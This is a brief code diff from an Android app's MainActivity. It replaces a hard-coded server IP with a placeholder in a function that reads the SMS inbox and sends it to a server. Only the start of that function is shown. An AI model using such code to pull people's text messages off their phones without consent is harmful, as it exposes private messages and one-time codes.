@@ -102,7 +102,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun readSmsAndSendToServer() {
-        val url = "http://192.168.35.43:8080/upload" // Replace with your server's URL
+        val url = "http://ip:8080/upload" // Replace with your server's URL
         val messages = mutableListOf<TextMessage>()
 
         val uri = Uri.parse("content://sms/inbox")
